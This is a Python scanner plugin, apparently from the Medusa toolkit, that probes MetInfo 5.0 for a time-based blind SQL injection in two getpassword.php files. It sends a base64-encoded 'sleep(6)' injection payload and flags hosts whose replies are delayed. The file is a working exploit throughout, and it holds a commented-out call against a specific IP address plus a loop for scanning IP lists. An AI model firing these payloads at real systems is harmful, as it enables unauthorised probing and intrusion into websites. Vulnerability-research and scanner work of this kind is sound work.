#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: metinfo5.0 getpassword.php两处时间盲注漏洞
referer: http://www.wooyun.org/bugs/wooyun-2010-021062
author: Ascotbe
reference: Lucifer
description: member/getpassword.php与admin/admin/getpassword.php文件中,经过base64解码后的值用explode打散后进入到
    SQL语句引起注入。
'''

import urllib
import requests
import time
def UrlProcessing(url):
    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port


payloads = [r"/member/getpassword.php?lang=cn&p=MSdvcihzZWxlY3Qgc2xlZXAoNikpIy4x",
            r"/admin/admin/getpassword.php?lang=cn&p=MSdvcihzZWxlY3Qgc2xlZXAoNikpIy4x"]
def medusa(Url,RandomAgent,ProxyIp):

    scheme, url, port = UrlProcessing(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    global   resp
    Medusas=[]
    headers = {
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'User-Agent': RandomAgent,
    }
    try:
        #s = requests.session()
        for payload in payloads:
            payload_url = scheme + "://" + url + payload
            start_time = time.time()
            if ProxyIp!=None:
                proxies = {
                    # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
                    "http": "http://" + str(ProxyIp)
                }
                resp = requests.get(payload_url, headers=headers, proxies=proxies, timeout=5, verify=False)
            elif ProxyIp==None:
                resp = requests.get(payload_url,headers=headers, timeout=5, verify=False)
            con = resp.text
            code = resp.status_code
            if  time.time() - start_time >= 6:
                Medusa = "{} 存在XXX漏洞\r\n漏洞详情:\r\nPayload:{}\r\n".format(url, payload_url)
                Medusas.append (str(Medusa))
    except Exception as e:
        pass
    return Medusas
#if __name__ == '__main__':
    # with open('1.txt', 'r') as f:
    #     for ip in f.readlines():
    #         ip = ip.strip()
    #         audit(assign('WWW', str(ip))[1])
    #medusa('54.37.131.33:8888',"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0",'')